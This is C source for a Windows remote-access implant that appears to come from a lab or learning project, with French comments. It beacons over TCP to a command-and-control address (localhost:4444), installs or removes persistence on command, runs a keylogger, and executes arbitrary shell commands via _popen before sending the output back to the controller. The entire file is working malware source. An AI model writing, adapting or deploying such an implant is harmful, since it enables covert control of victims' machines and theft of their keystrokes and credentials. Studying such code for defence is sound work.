#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "../include/keylog.h"
#include "modules/fivenine/fivenine.h"

#pragma comment(lib, "ws2_32.lib")

#define C2_ADDR "127.0.0.1"
#define C2_PORT 4444
#define BEACON_INTERVAL_MS 5000

int main(void)
{
    char agent_id[32];
    snprintf(agent_id, sizeof(agent_id), "agent-%lu",
             (unsigned long)GetCurrentProcessId());

    /* >>> AJOUT : init Winsock obligatoire avant socket() */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        fprintf(stderr, "[!] WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "[!] socket failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(C2_ADDR);
    server.sin_port = htons(C2_PORT);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        fprintf(stderr, "[!] connect failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("[+] Connecté en tant que %s\n", agent_id);

    static char buf[2048];
    static char output[65536];
    static char line[1024];
    static char result_msg[65536 + 128];

    while (1) {
        memset(buf, 0, sizeof(buf));
        snprintf(buf, sizeof(buf), "BEACON %s", agent_id);
        if (send(sock, buf, (int)strlen(buf), 0) == SOCKET_ERROR) break;

        memset(buf, 0, sizeof(buf));
        int n = recv(sock, buf, sizeof(buf) - 1, 0);
        if (n <= 0) break;
        buf[n] = '\0';

        if (strcmp(buf, "NONE") == 0) {
            Sleep(BEACON_INTERVAL_MS);
            continue;
        }

        memset(output, 0, sizeof(output));

        if (strncmp(buf, "PERSIST", 7) == 0) {
            int rc = fivenine_install();
            snprintf(output, sizeof(output),
                     "[fivenine] install rc=%d\n", rc);
        } else if (strncmp(buf, "UNPERSIST", 9) == 0) {
            int rc = fivenine_uninstall();
            snprintf(output, sizeof(output),
                     "[fivenine] uninstall rc=%d\n", rc);
        } else if (strncmp(buf, "KEYLOG", 6) == 0) {
            char *keys = start_keylog(10);
            snprintf(output, sizeof(output), "%s",
                     keys ? keys : "[keylog failed]");
        } else {
            FILE *fp = _popen(buf, "r");
            if (fp == NULL) {
                snprintf(output, sizeof(output), "[!] Erreur execution\n");
            } else {
                size_t total = 0;
                while (fgets(line, sizeof(line), fp) != NULL) {
                    size_t len = strlen(line);
                    if (total + len < sizeof(output) - 1) {
                        strcat(output, line);
                        total += len;
                    }
                }
                _pclose(fp);
            }
        }

        memset(result_msg, 0, sizeof(result_msg));
        snprintf(result_msg, sizeof(result_msg), "RESULT %s %s",
                 agent_id, output);
        send(sock, result_msg, (int)strlen(result_msg), 0);

        Sleep(BEACON_INTERVAL_MS);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}